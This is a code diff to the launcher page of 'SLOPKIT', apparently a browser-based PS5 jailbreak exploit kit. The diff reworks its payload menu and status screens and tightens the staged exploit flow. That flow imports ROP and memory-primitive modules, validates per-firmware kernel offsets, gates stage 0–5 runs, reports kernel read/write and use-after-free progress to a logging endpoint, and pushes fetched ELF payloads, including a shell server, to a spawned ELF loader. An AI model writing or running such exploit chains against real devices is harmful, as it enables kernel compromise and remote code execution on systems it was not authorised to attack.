@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>slopkit</title>
+<title>SLOPKIT</title>
 
 <script>(function () {
     var pending = [];
@@ -44,7 +44,7 @@
   #stage { font-size: 24px; padding: 9px 13px; border-radius: 6px;
            margin-bottom: 12px; background: #1b2430; border-left: 8px solid #5e81ac; }
   #stage.ok  { background: #16281c; border-left-color: #47c76a; color: #b8f0c6; }
-  #stage.bad { background: #2a1215; border-left-color: #e74856; color: #ffcdd2; }
+  #stage.bad { background: #1b2430; border-left-color: #5e81ac; color: #d8dee9; }
   #danger, #reboot, #verdict { display:none !important; }
 
   #reboot { display: none; font-size: 34px; font-weight: 800; padding: 20px 18px;
@@ -140,6 +140,11 @@
         border-radius: 14px; padding: 13px 15px; margin: 10px auto 0; }
 
   body.loader-ready #scr { display:none; }
+  #doneScreen { display:none; text-align:center; margin:20px auto; }
+  #doneScreen.on { display:block; }
+  #doneScreen .done-icon { width:80px; height:80px; margin:0 auto 16px; }
+  #doneScreen .done-text { font-size:22px; font-weight:700; margin-bottom:8px; }
+  #doneScreen .done-sub { font-size:16px; color:#7c8795; }
 
   body.quiet tr:not(.r-FAIL) td.d .note   { display: none; }
 
@@ -149,35 +154,40 @@
 
   body.quiet #stage { font-size: 34px; }
 
-  #statusIcon { display:flex; align-items:center; justify-content:center;
-    width:80px; height:80px; margin:0 auto 14px; border-radius:20px;
-    background:#151d2b; border:2px solid #2a3a52;
-    box-shadow:0 16px 48px rgba(0,0,0,.4); transition:border-color .3s, background .3s; }
-  #statusIcon svg { width:36px; height:36px; transition:stroke .3s; }
-  #statusIcon.ok  { border-color:#2e7d32; background:#0e1f13; }
+  #statusIcon {
+    box-sizing:border-box; display:flex; align-items:center; justify-content:center;
+    width:96px; height:96px; margin:0 auto 12px; border-radius:22px;
+    background:linear-gradient(135deg,#1e2d45,#131c2b);
+    border:2px solid #2a3a52;
+    box-shadow:0 20px 60px rgba(0,0,0,.45);
+    transition: border-color .4s, background .4s;
+  }
+  #statusIcon svg { width:48px; height:48px; transition: stroke .4s; }
+  #statusIcon.running { border-color:#ebcb8b; }
+  #statusIcon.running svg { stroke:#ebcb8b; animation:pulse 1.8s ease-in-out infinite; }
+  #statusIcon.ok { border-color:#47c76a; background:linear-gradient(135deg,#16281c,#0f2017); }
   #statusIcon.ok svg { stroke:#47c76a; }
-  #statusIcon.bad { border-color:#922; background:#1f0e10; }
+  #statusIcon.bad { border-color:#e74856; background:linear-gradient(135deg,#2a1520,#1c0e14); }
   #statusIcon.bad svg { stroke:#e74856; }
-
-  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }
-  #statusIcon.running { border-color:#3b82f6; animation:pulse 1.8s ease-in-out infinite; }
-  #statusIcon.running svg { stroke:#5e9bff; }
-
-  #failureMessage { display:none; margin:0 auto 10px; color:#ff6473;
-    font-size:22px; font-weight:700; text-align:center; letter-spacing:.02em; }
+  @keyframes pulse { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:.6;transform:scale(.95)} }
+  #failureMessage { display:none; margin:0 auto 12px; color:#ff6473;
+    font-size:25px; font-weight:800; text-align:center; letter-spacing:.02em; }
   #failureMessage.on { display:block; }
 
   body.loader-ready { justify-content:flex-start; overflow-y:auto; padding-top:22px; }
-  body.loader-ready #statusIcon { width:64px; height:64px; margin-bottom:8px; }
-  body.loader-ready #statusIcon svg { width:28px; height:28px; }
+  body.loader-ready #statusIcon { width:80px; height:80px; margin-bottom:6px; }
+  body.loader-ready #statusIcon svg { width:40px; height:40px; }
   body.loader-ready #nav { display:none !important; }
-  #payloadMenu { display:none; width:330px; max-width:86vw; margin:4px auto 24px; }
+  #payloadMenu { display:none; width:1356px; max-width:94vw; margin:4px auto 24px; }
   #payloadMenu.on { display:block; }
   #payloadMenu .menuTitle { display:block; width:330px; height:56px;
-    max-width:100%; margin:0 0 10px; }
+    max-width:100%; margin:0 auto 12px; }
+  #payloadMenu .payloadGrid { display:flex; flex-wrap:wrap;
+    justify-content:center; }
   #payloadMenu .payloadTile {
-    box-sizing:border-box; display:block; width:330px; max-width:100%;
-    margin:0 0 10px; padding:0; border:0; border-radius:13px;
+    box-sizing:border-box; display:block; flex:0 0 calc(25% - 12px);
+    width:330px; min-width:0; max-width:330px; margin:6px; padding:0;
+    border:0; border-radius:13px;
     background:transparent; text-decoration:none !important;
   }
   #payloadMenu .payloadTile:focus { outline:3px solid #fff; outline-offset:2px; }
@@ -189,7 +199,7 @@
 </style>
 </head>
 <body class="quiet">
-<div id="failureMessage">运气不佳 &mdash; 请重启后再试</div>
+<div id="failureMessage">未成功 &mdash; 请重启主机</div>
 <div id="statusIcon" class="running">
   <svg viewBox="0 0 24 24" fill="none" stroke="#5e81ac" stroke-width="1.6"
        stroke-linecap="round" stroke-linejoin="round">
@@ -199,6 +209,11 @@
   </svg>
 </div>
 <h1>SLOPKIT</h1>
+<div id="doneScreen">
+  <div class="done-icon"></div>
+  <div class="done-text"></div>
+  <div class="done-sub"></div>
+</div>
 <div id="reboot"></div>
 <div id="verdict"></div>
 <div id="danger"></div>
@@ -209,14 +224,19 @@
 <pre id="scr"></pre>
 <div id="payloadMenu">
   <img class="menuTitle" data-src="../ui/payload-menu-title.png" alt="">
-  <a class="payloadTile" href="#" data-name="ftpsrv-ps5.elf" data-key="ftp"><img data-src="../ui/payload-ftp-default.png" alt=""></a>
-  <a class="payloadTile" href="#" data-name="gdbsrv-ps5.elf" data-key="gdb"><img data-src="../ui/payload-gdb-default.png" alt=""></a>
-  <a class="payloadTile" href="#" data-name="klogsrv-ps5.elf" data-key="klog"><img data-src="../ui/payload-klog-default.png" alt=""></a>
-  <a class="payloadTile" href="#" data-name="shsrv-ps5.elf" data-key="shell"><img data-src="../ui/payload-shell-default.png" alt=""></a>
-  <a class="payloadTile" href="#" data-name="websrv-ps5.elf" data-key="web"><img data-src="../ui/payload-web-default.png" alt=""></a>
+  <div class="payloadGrid">
+    <a class="payloadTile" href="#" data-name="ftpsrv-ps5.elf" data-key="ftp"><img data-src="../ui/payload-ftp-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="gdbsrv-ps5.elf" data-key="gdb"><img data-src="../ui/payload-gdb-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="klogsrv-ps5.elf" data-key="klog"><img data-src="../ui/payload-klog-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="shsrv-ps5.elf" data-key="shell"><img data-src="../ui/payload-shell-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="websrv-ps5.elf" data-key="web"><img data-src="../ui/payload-web-default.png" alt=""></a>
+    <a class="payloadTile" href="#" data-name="kstuff.elf" data-key="kstuff"><img data-src="../ui/payload-kstuff-default.png" alt="KStuff"></a>
+    <a class="payloadTile" href="#" data-name="PLK.elf" data-key="plk"><img data-src="../ui/payload-plk-default.png" alt="PLK PLD Manager"></a>
+  </div>
 </div>
 <div id="nav"></div>
-<div id="arm" hidden>请使用 <b>?go=1</b> 参数打开此页面以启动。否则不会执行任何操作。</div>
+<div id="arm" hidden>Open this page with <b>?go=1</b> to arm it. Nothing runs
+otherwise.</div>
 <div id="wrap">
 <table>
   <thead><tr><th>#</th><th>test</th><th>st</th><th>result</th></tr></thead>
@@ -229,7 +249,7 @@
 <div id="console" hidden></div>
 
 <script src="rop.js"></script>
-<script src="main.js?v=16"></script>
+<script src="main.js?v=19"></script>
 <script>window.offsetsReady = new Promise(function (res, rej) {
     var s = document.querySelector('script[src^="../offsets/"]');
     if (!s) return rej(new Error("offsets script was never injected by main.js"));
@@ -245,25 +265,62 @@
 <script type="module">import { establishPrimitive, fakeCellReleased } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js?v=10";
 import { int64 } from "./int64.js";
-import { BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList }
-    from "./poops.js?v=16";
 
+let BANNED, ERRNO, K, r32, r16, w32, hexBytes, coreList;
 let PK = null, makePoopsEngine = null, buildLadder = null;
 
 async function loadPoopsModules() {
-    const lib = await import("./poops.js?v=16");
-
-    await import("./poops.js?v=16");
-    const st = await import("./poops.js?v=16");
+    await window.offsetsReady;
+    const lib = await import("./poops.js?v=37");
+    BANNED = lib.BANNED;
+    ERRNO = lib.ERRNO;
+    K = lib.K;
+    r32 = lib.r32;
+    r16 = lib.r16;
+    w32 = lib.w32;
+    hexBytes = lib.hexBytes;
+    coreList = lib.coreList;
     PK = lib.PK;
     makePoopsEngine = lib.makePoopsEngine;
-    buildLadder = st.buildLadder;
-    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive");
+    buildLadder = lib.buildLadder;
+    if (!PK
+        || typeof PK.LK_PTHREAD_CREATE_NAME_NP !== "number"
+        || PK.LK_PTHREAD_CREATE_NAME_NP < 0
+        || typeof PK.LK_PTHREAD_JOIN !== "number"
+        || PK.LK_PTHREAD_JOIN < 0) {
+        throw new Error("firmware " + window.fw_str
+            + " profile loaded without pthread offsets: create="
+            + (PK && PK.LK_PTHREAD_CREATE_NAME_NP) + ", join="
+            + (PK && PK.LK_PTHREAD_JOIN));
+    }
+    flushMark("POOPS-MODULES-LOADED", "deferred-until-after-primitive-fw="
+        + window.fw_str + "-pthreadCreateOff=0x"
+        + (PK.LK_PTHREAD_CREATE_NAME_NP >>> 0).toString(16)
+        + "-pthreadJoinOff=0x" + (PK.LK_PTHREAD_JOIN >>> 0).toString(16));
 }
 
 const Q = new URLSearchParams(location.search);
+const LOG_DEBUG = Q.get("log") === "debug";
 const ARMED = Q.get("go") === "1";
 const CLEARLATCH = Q.get("clear") === "1";
+const CHECKPOINT = Q.get("checkpoint") === "1";
+const STAGE0_PROOF = Q.get("proof") === "stage0";
+const STAGE1_PROOF = Q.get("proof") === "stage1";
+const STAGE2_PROOF = Q.get("proof") === "stage2";
+const STAGE3_PROOF = Q.get("proof") === "stage3";
+const STAGE4_PROOF = Q.get("proof") === "stage4";
+const STAGE5_DRY_PROOF = Q.getAll("proof").length === 1
+    && Q.get("proof") === "stage5dry";
+const STAGE5_LIVE_PROOF = Q.getAll("proof").length === 1
+    && Q.get("proof") === "stage5live";
+const PROOF = STAGE5_LIVE_PROOF ? "stage5live"
+    : STAGE5_DRY_PROOF ? "stage5dry"
+        : STAGE4_PROOF ? "stage4" : STAGE3_PROOF ? "stage3"
+            : STAGE2_PROOF ? "stage2" : STAGE1_PROOF ? "stage1"
+                : STAGE0_PROOF ? "stage0" : "";
+const PROOF_TITLE = PROOF === "stage5live" ? "Stage 5 live"
+    : PROOF === "stage5dry" ? "Stage 5 dry"
+        : (PROOF ? "Stage " + PROOF.slice(5) : "");
 
 const AUTOCLEAR = Q.get("auto") === "1";
 const FROM = Q.get("from") || "";
@@ -274,20 +331,36 @@ const CORE_OVERRIDE = Q.has("core") ? parseInt(Q.get("core"), 10) : -1;
 
 const PROGRESS_KEY = "slopkit-poops:next";
 const RUNLOG_KEY = "slopkit-poops:last";
-const REV = "slopkit-poops-28-clean-success-menu";
+const ROUTE_VERSION = "41";
+const REV = "slopkit-poops-52-single-pass";
+const CHECKPOINT_ONLY = "ps0_preflight,ps1_prepare,ps3_stage0";
+const STAGE5_ONLY = "ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate,"
+    + "ps5_stage1,ps6_stage2,ps8_stage3,ps9_stage4,ps10_stage5";
+const STAGE5_FIRMWARES = Object.freeze([
+    "9.00", "9.05", "9.20", "9.40", "9.60", "10.00", "10.01", "10.20",
+    "10.40", "10.60", "11.00", "11.20", "11.40", "11.60", "12.00"
+]);
 
 function storeGet(k) {
     try { return sessionStorage.getItem(k) || ""; } catch { return ""; }
 }
 function storeSet(k, v) { try { sessionStorage.setItem(k, v); } catch { } }
 function storeDel(k) { try { sessionStorage.removeItem(k); } catch { } }
+function consumeStored(k) {
+    try {
+        sessionStorage.removeItem(k);
+        return sessionStorage.getItem(k) === null;
+    } catch (e) {
+        return false;
+    }
+}
 function storeJson(k) {
     const raw = storeGet(k);
     if (!raw) return null;
     try { return JSON.parse(raw); } catch { return null; }
 }
-const STALLED_AT = storeGet(PROGRESS_KEY);
-const LAST_RUN = storeJson(RUNLOG_KEY);
+let STALLED_AT = storeGet(PROGRESS_KEY);
+let LAST_RUN = storeJson(RUNLOG_KEY);
 
 const TRIGGER = (() => {
     const t = (Q.get("trigger") || "none").toLowerCase();
@@ -332,10 +405,124 @@ const cfg = {
         parseInt(Q.get("stage2deadline") || "", 10) || 900000))
 };
 
+const STAGE5_DRY_QUERY = Object.freeze({
+    go: "1", trigger: "netcontrol", attempts: "8", only: STAGE5_ONLY,
+    log: "debug", proof: "stage5dry", payload: "dry", v: ROUTE_VERSION
+});
+const STAGE5_LIVE_QUERY = Object.freeze({
+    go: "1", trigger: "netcontrol", attempts: "8", only: STAGE5_ONLY,
+    log: "debug", proof: "stage5live", payload: "1", v: ROUTE_VERSION
+});
+const PRODUCTION_QUERY = Object.freeze({
+    go: "1", auto: "1", production: "1", trigger: "netcontrol",
+    attempts: "8", only: STAGE5_ONLY, log: "debug", payload: "1",
+    v: ROUTE_VERSION
+});
+const STAGE5_INTENT = Q.has("stage5") || Q.has("payload")
+    || Q.getAll("proof").some(value => value.indexOf("stage5") === 0)
+    || Q.getAll("only").some(value => value.split(",")
+        .some(key => key.trim() === "ps10_stage5"));
+
+function exactQuery(expected) {
+    const keys = Object.keys(expected);
+    let count = 0, exact = true;
+    Q.forEach((value, key) => {
+        count++;
+        if (!Object.prototype.hasOwnProperty.call(expected, key)
+            || expected[key] !== value) exact = false;
+    });
+    return exact && count === keys.length
+        && keys.every(key => Q.getAll(key).length === 1);
+}
+
+const STAGE5_REQUEST_ERROR = (() => {
+    if (!STAGE5_INTENT) return "";
+    if (!exactQuery(STAGE5_DRY_QUERY) && !exactQuery(STAGE5_LIVE_QUERY)
+        && !exactQuery(PRODUCTION_QUERY))
+        return "noncanonical-stage5-request";
+    return STAGE5_FIRMWARES.indexOf(window.fw_str) >= 0
+        ? "" : "unsupported-stage5-firmware";
+})();
+
+const PRODUCTION_REQUEST_ERROR = (() => {
+    if (!Q.has("production") && !Q.has("auto") && !Q.has("next")) return "";
+    return exactQuery(PRODUCTION_QUERY)
+        ? "" : "noncanonical-production-request";
+})();
+const PRODUCTION_RUN = exactQuery(PRODUCTION_QUERY);
+
+function cleanNegativeCheckpoint(last) {
+    return last && last.rev === REV && last.checkpoint === true
+        && last.proof === "" && last.filtered === true
+        && last.only === CHECKPOINT_ONLY
+        && last.trigger === "none" && last.pass === 4
+        && last.fail === 0 && last.skip === 0
+        && last.reboot === false && !last.stoppedAt && !last.triggered
+        && !last.corrupt && !last.triplets && !last.setuidCalls
+        && last.socketsLeft === 0 && !last.chainDead && !last.cleanupFailed
+        && last.kernelWrites === 0;
+}
+
+function canRefreshCheckpoint(last) {
+    return ARMED && FILTERED_RUN && TRIGGER === "none" && cfg.attempts === 1
+        && ONLY.join(",") === CHECKPOINT_ONLY
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage0Proof(last) {
+    return STAGE0_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",")
+            === "ps0_preflight,ps1_prepare,ps3_stage0,ps4_validate"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage1Proof(last) {
+    return STAGE1_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage2Proof(last) {
+    return STAGE2_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage3Proof(last) {
+    return STAGE3_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2,ps8_stage3"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage4Proof(last) {
+    return STAGE4_PROOF && ARMED && FILTERED_RUN && TRIGGER === "netcontrol"
+        && cfg.attempts === 8
+        && ONLY.join(",") === "ps0_preflight,ps1_prepare,ps3_stage0,"
+            + "ps4_validate,ps5_stage1,ps6_stage2,ps8_stage3,ps9_stage4"
+        && cleanNegativeCheckpoint(last);
+}
+
+function canStartStage5Proof(last, proof, payload) {
+    return !STAGE5_REQUEST_ERROR && proof && ARMED && FILTERED_RUN
+        && STAGE5_FIRMWARES.indexOf(window.fw_str) >= 0
+        && cfg.payload === payload
+        && TRIGGER === "netcontrol" && cfg.attempts === 8
+        && ONLY.join(",") === STAGE5_ONLY
+        && cleanNegativeCheckpoint(last)
+        && last.fw === window.fw_str && last.payload === "";
+}
+
 let elfldrSpawned = false;
 const screenLines = [];
 
-const SCREEN_LINES = 22;
+const SCREEN_LINES = 12;
 const scrEl = document.getElementById("scr");
 
 const clean = s => String(s).replace(/[^A-Za-z0-9_.:=,+-]/g, "_").slice(0, 200);
@@ -373,10 +560,140 @@ function screenLine(text) {
     try { scrEl.textContent = screenLines.join("\n"); } catch { }
 }
 
-const SCREEN_SHOW = /^(STAGE[1-5]-|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE)/;
+const CONCISE_SCREEN_SHOW = {
+    "POOPS-BOOT": 1,
+    "OFFSETS-READY": 1,
+    "TRIGGER-ARMED": 1,
+    "TRIGGER-FIRED": 1,
+    "LATCH-SET": 1,
+    "LATCH-ESCALATE": 1,
+    "LATCH-CLEAR": 1,
+    "LATCH-HELD": 1,
+    "LATCH-RELEASED": 1,
+    "POOPS-LATCHED": 1,
+    "POOPS-STALLED": 1,
+    "BOOT-STALLED": 1,
+    "CHAIN-DEAD": 1,
+    "STAGE5-DONE": 1,
+    "POOPS-COMPLETE": 1,
+    "POOPS-FAILED": 1,
+    "ELF-SENT": 1,
+    "ELF-SEND-FAILED": 1,
+    "ELF-SENDER-BLOCKED": 1
+};
+const DEBUG_SCREEN_SHOW = /^(STAGE[0-5]-|ALLPROC-CHECK|ALIASES-REPAIRED|POOPS-COMPLETE|POOPS-VERDICT|LATCH-HELD|LATCH-READ|OFFSETS-READY|WEBKIT-BASE|MODULE-BASES|SOCKETS|SPAWN|WAKEGATE)/;
+const REMOTE_DETAIL_SHOW = {
+    "STAGE1-FREE-T1": 1,
+    "STAGE1-HIT": 1,
+    "STAGE1-NO-SIG": 1,
+    "STAGE1-FDP": 1,
+    "KREAD-OK": 1,
+    "KREAD-REFUSED": 1,
+    "KSLOW-FAILED": 1,
+    "STAGE2-READ": 1,
+    "STAGE2-RETRY": 1,
+    "PROOF-CONSUMED": 1,
+    "KWRITE-OK": 1,
+    "KWRITE-IOV-CHANGED": 1,
+    "UIOW-RELEASED": 1,
+    "UIOW-RELEASE-FAILED": 1,
+    "STAGE3-CORRUPT-PRE": 1,
+    "STAGE3-READTEST-CROSS": 1,
+    "STAGE3-READTEST-PID": 1,
+    "STAGE3-READTEST-PID-SKIP": 1,
+    "STAGE3-WRITETEST": 1,
+    "ALIASES-REPAIRED": 1,
+    "RTHDR-REMOVED": 1,
+    "UAF-FILE-REMOVED": 1,
+    "ALLPROC-CHECK": 1,
+    "STAGE4-PRE": 1,
+    "STAGE4-KPROC-WALK-FAIL": 1,
+    "STAGE4-DYNLIB": 1,
+    "STAGE4-DYNLIB-SAFE": 1,
+    "STAGE4-VERIFY": 1,
+    "FAST-RW-SETUP-FAILED": 1
+};
+const REMOTE_LOG_URL = "/__poops_log";
+const REMOTE_LOG_STARTED = Date.now();
+const REMOTE_LOG_SESSION = REMOTE_LOG_STARTED.toString(36) + "-"
+    + Math.floor(Math.random() * 0x100000000).toString(36);
+const REMOTE_STAGE_SHOW = /^STAGE5-|^STAGE[0-4]-(ATTEMPT|OK|DONE|FAIL|FAILED|CONTROL|DEADLINE|VERIFY-FAILED|RW|ATTR|CREATE-RET|GETUID)$/;
+const REMOTE_STAGE5_FLUSH = /^STAGE5-(ENTER|STAGED|SHELLCODE-VERIFY|ALIAS-VERIFY|ARGS|PIPEBUF|SPAWN|CREATE-RET|JOIN-PRE|DONE)$/;
+const remoteEvents = [];
+let remoteSequence = 0, remoteFlushTimer = null, remoteEarlyAttached = false;
+
+function captureRemoteEvent(tag, extra) {
+    if (tag !== "TEST" && CONCISE_SCREEN_SHOW[tag] !== 1
+        && !/^(POOPS-|LATCH-|TRIGGER-)/.test(tag)
+        && tag !== "CHAIN-DEAD" && tag !== "PAGE-LEFT-MID-RUN"
+        && tag !== "OFFSETS-READY" && REMOTE_DETAIL_SHOW[tag] !== 1
+        && !REMOTE_STAGE_SHOW.test(tag)) return;
+    remoteEvents.push({
+        seq: ++remoteSequence,
+        ms: Date.now() - REMOTE_LOG_STARTED,
+        tag: String(tag).slice(0, 64),
+        extra: extra == null ? "" : String(extra).slice(0, 1024)
+    });
+    if (remoteEvents.length > 120) remoteEvents.shift();
+    if (REMOTE_STAGE5_FLUSH.test(tag) && remoteFlushTimer === null)
+        remoteFlushTimer = setTimeout(function () {
+            remoteFlushTimer = null;
+            sendRemoteEvents(false);
+        }, 0);
+}
+
+function sendRemoteEvents(unloading) {
+    if (remoteFlushTimer !== null) {
+        clearTimeout(remoteFlushTimer);
+        remoteFlushTimer = null;
+    }
+    if (!remoteEvents.length) return;
+    const events = remoteEvents.splice(0, remoteEvents.length);
+    const early = !remoteEarlyAttached && Array.isArray(window.__jbEarly)
+        ? window.__jbEarly.slice(-8) : [];
+    remoteEarlyAttached = true;
+    for (let i = 0; i < early.length && events.length < 128; ++i) {
+        events.push({
+            seq: ++remoteSequence,
+            ms: Date.now() - REMOTE_LOG_STARTED,
+            tag: "EARLY",
+            extra: String(early[i]).slice(0, 1024)
+        });
+    }
+    const body = JSON.stringify({
+        v: 1,
+        session: REMOTE_LOG_SESSION,
+        rev: REV,
+        fw: typeof window.fw_str === "string" ? window.fw_str : "",
+        page: location.pathname + location.search,
+        events: events
+    });
+    if (unloading && typeof navigator.sendBeacon === "function") {
+        try { if (navigator.sendBeacon(REMOTE_LOG_URL, body)) return; } catch (e) { }
+    }
+    try {
+        fetch(REMOTE_LOG_URL, {
+            method: "POST",
+            headers: { "Content-Type": "text/plain;charset=UTF-8" },
+            body: body,
+            cache: "no-store"
+        }).catch(function () { });
+    } catch (e) { }
+}
 
 function screenMark(tag, extra) {
     const s0 = extra == null ? "" : String(extra);
+    if (tag === "STAGE5-DONE" && /(?:^|-)joinRet=0(?:-|$)/.test(s0) &&
+        /(?:^|-)shellcodeRet=0x0+(?:-|$)/.test(s0)) {
+        elfldrSpawned = true;
+        document.body.classList.add("loader-ready");
+        clearFailureBanners();
+        setCatResult(true);
+        showVerdict(false, "ELF 加载器就绪");
+        stage("ELF 加载器就绪", "ok");
+    }
+    catState(tag, s0);
+    captureRemoteEvent(tag, s0);
     let line;
     if (tag === "TEST") {
 
@@ -387,23 +704,15 @@ function screenMark(tag, extra) {
         if (i >= 0 && /FAIL/.test(head))
             line += ": " + s0.slice(i + m[0].length).replace(/_/g, " ");
     } else if (tag === "TEST-ENTER") {
-
+        if (!LOG_DEBUG) return;
         line = "> " + s0.replace(/-chainMarks.*$/, "").replace(/-/, " ");
-    } else if (SCREEN_SHOW.test(tag) && !tag.endsWith("-PRE")) {
+    } else if ((CONCISE_SCREEN_SHOW[tag] === 1
+        || (LOG_DEBUG && DEBUG_SCREEN_SHOW.test(tag)))
+        && !tag.endsWith("-PRE")) {
         line = s0 ? tag + " " + s0.replace(/_/g, " ") : tag;
     } else return;
-    if (tag === "STAGE5-DONE" && /(?:^|-)joinRet=0(?:-|$)/.test(s0) &&
-        /(?:^|-)shellcodeRet=0x0+(?:-|$)/.test(s0)) {
-        elfldrSpawned = true;
-        document.body.classList.add("loader-ready");
-        clearFailureBanners();
-        setCatResult(true);
-        showVerdict(false, "ELF 加载器就绪");
-        stage("ELF 加载器就绪", "ok");
-    }
     if (line.length > 110) line = line.slice(0, 107) + "...";
     screenLine(line);
-    catState(tag, s0);
 }
 
 function catState(tag, extra) {
@@ -503,6 +812,7 @@ function showPayloadMenu() {
 }
 
 function setPayloadTileState(tile, state) {
+    tile.setAttribute("data-state", state);
     const image = tile.getElementsByTagName("img")[0];
     const key = tile.getAttribute("data-key");
     if (image && key)
@@ -555,28 +865,28 @@ function preparePayloadSender() {
 
 async function sendPayloadToElfldr(name, skipListCheck) {
     if (!elfldrSpawned)
-        throw new Error("ELF loader is not ready");
+        throw new Error("ELF 加载器未就绪");
     if (!P || !chain)
-        throw new Error("the post-jailbreak ROP runtime is unavailable");
+        throw new Error("越狱后 ROP 运行时不可用");
     if (chainDead)
-        throw new Error("the ROP chain is unusable after " + chainDead);
+        throw new Error("ROP 链在 " + chainDead + " 之后不可用");
     if (payloadSenderBlocked)
         throw new Error(payloadSenderBlocked);
     if (!skipListCheck && !payloadIsListed(name))
-        throw new Error("payload is not listed in this menu");
+        throw new Error("载荷未在菜单中列出");
 
     const response = await fetch("../payloads/" + encodeURIComponent(name),
         { cache: "no-store" });
     if (!response.ok)
-        throw new Error("payload fetch failed: HTTP " + response.status);
+        throw new Error("载荷下载失败: HTTP " + response.status);
     const bytes = new Uint8Array(await response.arrayBuffer());
     if (!bytes.length)
-        throw new Error("payload is empty");
+        throw new Error("载荷文件为空");
     if (bytes.length > PAYLOAD_MAX_SIZE)
-        throw new Error("payload is larger than the 3 MiB limit");
+        throw new Error("载荷文件超过 3 MiB 限制");
     if (bytes.length < 4 || bytes[0] !== 0x7f || bytes[1] !== 0x45
         || bytes[2] !== 0x4c || bytes[3] !== 0x46)
-        throw new Error("payload does not start with the ELF signature");
+        throw new Error("载荷文件不是有效的 ELF 格式");
 
     preparePayloadSender();
     let fd = -1;
@@ -660,43 +970,6 @@ async function sendPayloadToElfldr(name, skipListCheck) {
         closeWarning: closeWarning };
 }
 
-async function autoLaunchPldmgr() {
-    stage("正在启动 Payload Manager...", "ok");
-    try {
-        const result = await sendPayloadToElfldr("pldmgr_v0.5.1.elf", true);
-        flushMark("PLDMGR-AUTO-SENT", "bytes=" + result.bytes);
-        showDoneScreen(true);
-        return true;
-    } catch (error) {
-        flushMark("PLDMGR-AUTO-FAILED", "why="
-            + clean(error && error.message ? error.message : error));
-        showDoneScreen(false, error && error.message ? error.message : error);
-        return false;
-    }
-}
-
-function showDoneScreen(success, errorMsg) {
-    var icon = document.getElementById("statusIcon");
-    if (icon) {
-        icon.className = success ? "ok" : "bad";
-        icon.innerHTML = success
-            ? '<svg viewBox="0 0 24 24" fill="none" stroke="#47c76a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>'
-            : '<svg viewBox="0 0 24 24" fill="none" stroke="#e74856" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>';
-    }
-    var stageEl = document.getElementById("stage");
-    if (stageEl) {
-        if (success) {
-            stageEl.className = "ok";
-            stageEl.innerHTML = "Payload Manager 已启动"
-                + '<div style="font-size:14px;color:#7a9a7f;margin-top:4px">'
-                + '现在可以关闭此页面</div>';
-        } else {
-            stageEl.className = "bad";
-            stageEl.textContent = "Payload Manager 启动失败: " + (errorMsg || "未知错误");
-        }
-    }
-}
-
 async function sendPayloadInPlace(name, tile) {
     if (payloadSendBusy) return;
     payloadSendBusy = true;
@@ -748,6 +1021,41 @@ async function sendPayloadInPlace(name, tile) {
     }
 }
 
+function showDoneScreen(success, errorMsg) {
+    const ds = document.getElementById("doneScreen");
+    if (!ds) return;
+    const iconEl = ds.querySelector(".done-icon");
+    const textEl = ds.querySelector(".done-text");
+    const subEl = ds.querySelector(".done-sub");
+    if (success) {
+        iconEl.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#47c76a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="80" height="80"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>';
+        textEl.textContent = "PLK Payload Manager 已启动";
+        textEl.style.color = "#47c76a";
+        subEl.textContent = "请在 PLK 管理界面中继续操作";
+    } else {
+        iconEl.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="#e74856" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="80" height="80"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>';
+        textEl.textContent = "PLK 启动失败";
+        textEl.style.color = "#e74856";
+        subEl.textContent = errorMsg || "未知错误";
+    }
+    ds.className = "on";
+}
+
+async function autoLaunchPLK() {
+    stage("正在启动 Payload Manager...", "ok");
+    try {
+        const result = await sendPayloadToElfldr("PLK.elf", true);
+        flushMark("PLK-AUTO-SENT", "bytes=" + result.bytes);
+        showDoneScreen(true);
+        return true;
+    } catch (error) {
+        flushMark("PLK-AUTO-FAILED", "why="
+            + clean(error && error.message ? error.message : error));
+        showDoneScreen(false, error && error.message ? error.message : error);
+        return false;
+    }
+}
+
 function stage(text, cls) {
     if (cls === "bad") setCatResult(false);
     if (elfldrSpawned && cls === "bad") return;
@@ -772,7 +1080,9 @@ function setCatResult(success) {
